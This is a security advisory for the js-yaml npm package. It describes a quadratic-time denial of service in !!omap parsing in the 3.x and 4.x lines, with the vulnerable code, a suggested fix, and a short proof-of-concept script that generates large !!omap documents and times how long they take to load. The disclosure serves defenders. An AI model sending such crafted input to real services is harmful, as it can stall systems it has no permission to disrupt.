# [H] JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE-2026-59870 fix not backported

## Summary
Severity: High
Advisory: GHSA-5p4m-2wfm-xmqj
CWE: CWE-407
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-06
Source: https://github.com/advisories/GHSA-5p4m-2wfm-xmqj
Type: github-advisory

## Affected
- npm: `js-yaml` — affected >=4.0.0 <4.3.1
- npm: `js-yaml` — affected >=3.0.0 <3.15.1

## Details
# Quadratic CPU consumption in `!!omap` resolution (js-yaml 3.x and 4.x)

## Summary

`resolveYamlOmap()` enforces key uniqueness for `!!omap` sequences with a linear
scan (`objectKeys.indexOf(...)`) inside the per-element loop, making resolution
**O(n²)** in the number of entries. A modestly sized YAML document therefore
consumes disproportionate CPU inside `yaml.load()`, giving a denial of service
against any consumer that parses untrusted YAML.

`!!omap` is registered in the **default schema**
(`lib/schema/default.js` → `require('../type/omap')`), so a plain
`yaml.load(untrustedInput)` with no options is affected — no custom schema or
non-default configuration is required.

**This is the same weakness as CVE-2026-59870 / GHSA-724g-mxrg-4qvm**, which was
fixed in the 5.x line in 5.2.1. That fix was never backported: both currently
maintained legacy lines still carry the original implementation.

## Affected versions

| Line | Latest tested | Status |
|---|---|---|
| 3.x | **3.15.0** | Affected — `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:29` |
| 4.x | **4.3.0** | Affected — `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:30` |
| 5.x | 5.2.2 | **Not affected** — fixed in 5.2.1 (uses a `Set`) |

Both figures are the newest release of each line at the time of writing, so
this is not a "you are on an old version" issue.

## Details

`lib/type/omap.js` (js-yaml 4.3.0):

```js
if (objectKeys.indexOf(pairKey) === -1) objectKeys.push(pairKey)
else return false
```

`objectKeys` grows by one element per entry, and `Array.prototype.indexOf` is a
linear scan, so resolving an `n`-entry `!!omap` performs roughly
`1 + 2 + … + n` comparisons — quadratic in `n`. The work happens synchronously
inside `yaml.load()`, blocking the event loop for its whole duration.

The 5.x line already solves exactly this by tracking seen keys in a `Set`
(`src/tag/sequence/omap.ts`):

```ts
if (carrier.seen.has(key)) return 'duplicate key in ordered map'
carrier.seen.add(key)
```

## Proof of concept

```js
// poc.js  —  node poc.js
const yaml = require('js-yaml');
const doc = n => '!!omap\n' + Array.from({length: n}, (_, i) => `- k${i}: ${i}`).join('\n') + '\n';

for (const n of [10000, 20000, 40000, 80000]) {
  const d = doc(n), t = Date.now();
  yaml.load(d);                      // default schema, no options
  console.log(`n=${n} bytes=${d.length} load=${Date.now() - t}ms`);
}
```

### Measured (node v20.20.2, default heap, no flags)

**js-yaml 4.3.0**

```
n=10000  bytes=137787   load=54ms
n=20000  bytes=297787   load=169ms
n=40000  bytes=617787   load=646ms
n=80000  bytes=1257787  load=2607ms
```

**js-yaml 3.15.0**

```
n=10000  bytes=137787   load=53ms
n=20000  bytes=297787   load=166ms
n=40000  bytes=617787   load=641ms
n=80000  bytes=1257787  load=2567ms
```

Runtime grows by a factor of ~4 for each doubling of `n`, which is the
signature of O(n²) (linear growth would be ~2×).

Scaling further: a **2.48 MB** document with 150,000 entries blocked
`yaml.load()` for **10.8 seconds**.

## Impact

Any service that parses attacker-influenced YAML with js-yaml 3.x or 4.x can be
stalled with a small input. Because the loop is synchronous, a single request
blocks the Node.js event loop and stalls every other request in the process —
so the amplification is per-process, not just per-request.

Suggested severity: consistent with **CVE-2026-59870** (the same weakness in
5.x), i.e. Availability-only impact, network attack vector, no privileges or
user interaction required.

## Suggested fix

Mirror the 5.x fix — replace the linear scan with a `Set`:

```js
// lib/type/omap.js
const seen = new Set()
// ...
if (seen.has(pairKey)) return false
seen.add(pairKey)
```

This preserves the existing duplicate-key rejection semantics exactly while
making resolution O(n). A `maxOmapLength`-style cap would also work, but the
`Set` matches what 5.x already ships and requires no new option.

## References

- CVE-2026-59870 / GHSA-724g-mxrg-4qvm — same weakness in 5.0.0–5.2.0, fixed in 5.2.1
- `lib/type/omap.js` (3.x, 4.x) — the affected resolver
- `lib/schema/default.js` — registers `!!omap` in the default schema

## Discovery

Found by an automated static-analysis and executed-proof-of-concept scanner run
against js-yaml 4.2.0, then manually verified against 3.15.0 and 4.3.0 by
executing the proof of concept above. All timings in this report were measured
on the **current** releases of each line, not on the version originally scanned.

## References
- https://github.com/nodeca/js-yaml/security/advisories/GHSA-5p4m-2wfm-xmqj
- https://github.com/nodeca/js-yaml
